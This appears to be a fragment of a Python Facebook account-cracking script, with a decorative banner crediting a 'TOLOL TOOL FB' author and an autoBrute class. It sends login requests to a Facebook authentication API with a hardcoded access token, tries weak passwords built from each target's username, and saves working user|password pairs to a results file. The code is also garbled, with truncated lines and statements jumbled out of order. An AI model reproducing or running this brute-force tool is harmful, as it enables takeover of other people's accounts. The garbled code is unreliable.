...
print ("\033[34m▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀  ╚██████╔╝███████╗")
print ("    \033[37m                   ╚═════╝ ╚══════╝")
print ("\033[93mTOLOL TOOL FB codes by:a۲ہx. \033[37m")
...
class autoBrute:
        ...
        def gen(self):
                self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac2                   >
                try:
                ...
                for x in [self.user+"123",self.user+"12345"]:
                        ...
                        if "save-device" in r or "m_sess" in r:
                                open("multiresult.txt","a").write(
                                        "%s|%s\n"%(target,x))
                      "%s|%s\n"%(target,x))                                                      break
                self.loop+=1                                                                       print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
                        len(self.cp),self.loop,len(self.target),
                                G,len(self.found),N)),;sys.stdout.flush()
                                                                                   autoBrute()          self.found.append("%s|%s"%(target,x))
                                break
